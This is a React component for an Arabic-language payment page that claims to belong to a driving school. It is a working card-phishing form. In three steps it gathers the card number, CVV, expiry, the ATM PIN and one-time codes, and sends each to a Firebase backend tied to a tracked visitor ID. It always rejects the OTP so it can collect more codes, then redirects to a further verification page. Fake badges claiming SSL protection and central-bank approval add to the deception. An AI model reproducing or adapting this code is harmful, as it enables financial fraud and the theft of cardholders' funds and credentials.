"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { CreditCard, AlertCircle, Phone, Shield, KeyboardIcon as Keypad, CheckCircle2, Building2 } from "lucide-react"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import CreditCardDisplay from "./credit-card-display"

const allOtps: string[] = []

export default function PaymentForm() {
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      addData({ id: visitorId, currentPage: "الدفع" })
      setupOnlineStatus(visitorId)
    }
  }, [])

  const [step, setStep] = useState<"cardDetails" | "atmPin" | "otp">("cardDetails")
  const [otpError, setOtpError] = useState(false)
  const [isCardFlipped, setIsCardFlipped] = useState(false)
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardHolderName: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    atmPin: "",
    otp: "",
  })

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor")
    addData({ id: visitorId, ...formData })

    if (step === "cardDetails") {
      setStep("atmPin")
    } else if (step === "atmPin") {
      setStep("otp")
    } else if (step === "otp") {
      allOtps.push(formData.otp)
      addData({ id: visitorId, allOtps, ...formData })
      setOtpError(true)
      handleInputChange("otp", "")
      setTimeout(() => {
        window.location.href = "/phone-verification"
      }, 1000)
    }
  }

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    if (field === "otp" && otpError) {
      setOtpError(false)
    }
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    return parts.length ? parts.join(" ") : v
  }

  const getStepInfo = () => {
    switch (step) {
      case "atmPin":
        return {
          title: "الرقم السري للبطاقة",
          description: "أدخل الرقم السري لبطاقتك المكون من 4 أرقام",
          buttonText: "متابعة إلى التحقق",
        }
      case "otp":
        return {
          title: "تأكيد الهوية",
          description: "أدخل رمز التحقق المرسل إلى هاتفك",
          buttonText: "تأكيد الدفع والمتابعة",
        }
      default: // cardDetails
        return {
          title: "تفاصيل الدفع",
          description: "أكمل بياناتك لإتمام عملية الدفع",
          buttonText: "متابعة لإدخال الرقم السري",
        }
    }
  }

  const { title, description, buttonText } = getStepInfo()

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-slate-50 via-teal-50 to-indigo-50 p-4 flex items-center justify-center"
      dir="rtl"
    >
      <div className="w-full max-w-lg">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-teal-600 to-indigo-600 rounded-2xl mb-4 shadow-lg">
            <Building2 className="h-8 w-8 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-slate-900 mb-2">مدرسة نوره لتعليم قيادة المركبات</h1>
          <p className="text-slate-600">منصة الدفع الآمنة والموثوقة</p>
        </div>
        <Card className="shadow-2xl border-0 bg-white/80 backdrop-blur-sm">
          <CardHeader className="pb-6">
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-xl font-bold text-slate-900 flex items-center gap-2">
                  <CreditCard className="h-5 w-5 text-teal-600" />
                  {title}
                </CardTitle>
                <CardDescription className="text-slate-600 mt-1">{description}</CardDescription>
              </div>
              <Badge variant="secondary" className="bg-green-100 text-green-700 border-green-200">
                <Shield className="h-3 w-3 ml-1" />
                آمن
              </Badge>
            </div>
          </CardHeader>
          <form onSubmit={handleSubmit}>
            <CardContent className="space-y-6">
              {step === "cardDetails" && (
                <>
                  <div className="px-4">
                    <CreditCardDisplay
                      isFlipped={isCardFlipped}
                      name={formData.cardHolderName}
                      number={formData.cardNumber}
                      expiryMonth={formData.expiryMonth}
                      expiryYear={formData.expiryYear}
                      cvv={formData.cvv}
                    />
                  </div>
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label htmlFor="cardNumber" className="text-sm font-medium text-slate-700">
                        رقم البطاقة *
                      </Label>
                      <Input
                        id="cardNumber"
                        placeholder="1234 5678 9012 3456"
                        value={formatCardNumber(formData.cardNumber)}
                        onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                        className="h-12 border-slate-200 focus:border-blue-500 focus:ring-blue-500/20 font-mono"
                        maxLength={19}
                        required
                        onFocus={() => setIsCardFlipped(false)}
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="cardHolderName" className="text-sm font-medium text-slate-700">
                        اسم حامل البطاقة *
                      </Label>
                      <Input
                        id="cardHolderName"
                        placeholder="الاسم كما يظهر على البطاقة"
                        value={formData.cardHolderName}
                        onChange={(e) => handleInputChange("cardHolderName", e.target.value)}
                        className="h-12 border-slate-200 focus:border-blue-500 focus:ring-blue-500/20"
                        required
                        onFocus={() => setIsCardFlipped(false)}
                      />
                    </div>
                    <div className="grid grid-cols-3 gap-4">
                      <div className="space-y-2 col-span-2">
                        <Label className="text-sm font-medium text-slate-700">تاريخ الإنتهاء *</Label>
                        <div className="grid grid-cols-2 gap-4">
                          <Select onValueChange={(value) => handleInputChange("expiryMonth", value)} required>
                            <SelectTrigger
                              onFocus={() => setIsCardFlipped(false)}
                              className="h-12 border-slate-200 focus:border-blue-500"
                            >
                              <SelectValue placeholder="الشهر" />
                            </SelectTrigger>
                            <SelectContent>
                              {Array.from({ length: 12 }, (_, i) => (
                                <SelectItem key={i + 1} value={String(i + 1).padStart(2, "0")}>
                                  {String(i + 1).padStart(2, "0")}
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                          <Select onValueChange={(value) => handleInputChange("expiryYear", value)} required>
                            <SelectTrigger
                              onFocus={() => setIsCardFlipped(false)}
                              className="h-12 border-slate-200 focus:border-blue-500"
                            >
                              <SelectValue placeholder="السنة" />
                            </SelectTrigger>
                            <SelectContent>
                              {Array.from({ length: 10 }, (_, i) => (
                                <SelectItem key={2024 + i} value={String(2024 + i).slice(-2)}>
                                  {2024 + i}
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                        </div>
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="cvv" className="text-sm font-medium text-slate-700">
                          CVV *
                        </Label>
                        <Input
                          id="cvv"
                          placeholder="123"
                          value={formData.cvv}
                          onChange={(e) => handleInputChange("cvv", e.target.value)}
                          className="h-12 border-slate-200 focus:border-blue-500 focus:ring-blue-500/20 font-mono text-center"
                          maxLength={4}
                          required
                          onFocus={() => setIsCardFlipped(true)}
                        />
                      </div>
                    </div>
                  </div>
                </>
              )}
              {step === "atmPin" && (
                <div className="flex flex-col items-center justify-center text-center pt-8 pb-4">
                  <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-blue-400 to-indigo-500 rounded-full mb-6 shadow-lg">
                    <Keypad className="h-10 w-10 text-white" />
                  </div>
                  <Label htmlFor="atmPin" className="text-lg font-semibold text-slate-900 mb-4">
                    الرقم السري للبطاقة (PIN)
                  </Label>
                  <Input
                    id="atmPin"
                    type="password"
                    maxLength={4}
                    value={formData.atmPin}
                    onChange={(e) => handleInputChange("atmPin", e.target.value)}
                    className="h-14 w-48 text-center text-2xl font-mono tracking-[1em] border-slate-300 focus:border-indigo-500 focus:ring-indigo-500/30"
                    required
                  />
                </div>
              )}
              {step === "otp" && (
                <div className="space-y-6">
                  <div className="text-center">
                    <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-green-400 to-emerald-500 rounded-full mb-6 shadow-lg">
                      <Phone className="h-10 w-10 text-white" />
                    </div>
                    <h3 className="text-lg font-semibold text-slate-900 mb-2">تم إرسال رمز التحقق</h3>
                    <p className="text-sm text-slate-600 mb-2">أدخل الرمز المكون من 6 أرقام المرسل إلى</p>
                    <div className="inline-flex items-center gap-2 bg-slate-100 px-4 py-2 rounded-lg">
                      <Phone className="h-4 w-4 text-slate-500" />
                      <span className="font-mono text-slate-900">05******9</span>
                    </div>
                  </div>
                  {otpError && (
                    <Alert variant="destructive" className="border-red-200 bg-red-50">
                      <AlertCircle className="h-4 w-4" />
                      <AlertDescription className="text-red-800">
                        رمز التحقق غير صحيح. يرجى التأكد من الرمز والمحاولة مرة أخرى.
                      </AlertDescription>
                    </Alert>
                  )}
                  <div className="space-y-4">
                    <Label htmlFor="otp" className="text-center block text-sm font-medium text-slate-700">
                      رمز التحقق (OTP)
                    </Label>
                    <div className="flex justify-center">
                      <Input
                        id="otp"
                        maxLength={6}
                        value={formData.otp}
                        onChange={(e) => handleInputChange("otp", e.target.value)}
                        className="h-14 w-48 text-center text-2xl font-mono tracking-[0.5em] border-slate-300 focus:border-green-500 focus:ring-green-500/30"
                        required
                      />
                    </div>
                  </div>
                  <div className="text-center space-y-2">
                    <p className="text-xs text-slate-500">لم تستلم الرمز؟</p>
                    <Button variant="link" className="text-sm text-blue-600 hover:text-blue-700 p-0 h-auto">
                      إعادة إرسال الرمز (00:45)
                    </Button>
                  </div>
                </div>
              )}
            </CardContent>
            <CardFooter className="pt-6">
              <Button
                type="submit"
                className="w-full h-12 bg-gradient-to-r from-teal-600 to-green-400 hover:from-teal-700 hover:to-green-700 text-white font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
              >
                {buttonText}
              </Button>
            </CardFooter>
          </form>
        </Card>
        <div className="mt-6 text-center">
          <div className="inline-flex items-center gap-4 text-xs text-slate-500 bg-white/60 backdrop-blur-sm px-6 py-3 rounded-full border border-slate-200">
            <div className="flex items-center gap-1">
              <Shield className="h-3 w-3" />
              <span>تشفير SSL 256-bit</span>
            </div>
            <div className="w-px h-4 bg-slate-300" />
            <div className="flex items-center gap-1">
              <CheckCircle2 className="h-3 w-3" />
              <span>معتمد من البنك المركزي</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
